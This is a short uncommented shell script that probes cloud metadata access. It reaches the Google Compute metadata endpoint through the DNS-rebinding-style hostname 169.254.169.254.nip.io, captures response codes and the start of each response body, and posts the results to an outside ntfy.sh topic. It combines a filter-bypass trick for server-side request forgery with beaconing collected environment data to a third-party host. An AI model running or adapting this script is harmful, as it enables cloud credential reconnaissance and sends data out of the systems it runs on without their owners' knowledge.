#!/bin/sh
G="$1"
OUT=""
DN=$(getent hosts 169.254.169.254.nip.io 2>&1 | tr '\n' ' ')
[ -z "$DN" ] && DN="NXGETENT"
probe() {
  nm="$1"; url="$2"; hd="$3"
  bf="/tmp/rb.$$.$nm"; ef="/tmp/re.$$.$nm"
  if [ -n "$hd" ]; then
    r=$(curl -sS -m 8 -o "$bf" -w '%{http_code}|%{time_total}|%{size_download}' -H "$hd" "$url" 2>"$ef"); ec=$?
  else
    r=$(curl -sS -m 8 -o "$bf" -w '%{http_code}|%{time_total}|%{size_download}' "$url" 2>"$ef"); ec=$?
  fi
  bd=$(head -c 80 "$bf" 2>/dev/null | tr '\n\r\t' '   ' | tr -c '[:print:]' '.')
  er=$(head -c 60 "$ef" 2>/dev/null | tr '\n\r\t' '   ')
  OUT="$OUT~${nm}=${r}|ec${ec}|B:${bd}|E:${er}"
}
probe pubNiP http://example.com.nip.io/ ""
probe nipMeta http://169.254.169.254.nip.io/computeMetadata/v1/ "Metadata-Flavor: Google"
OUT="$OUT~DNS=$DN"
curl -fsS -m 8 -d "PROBE6 $G $OUT" "https://ntfy.sh/i80895-b111fb4b" >/dev/null 2>&1 || true
echo "ENVOK-$OUT"
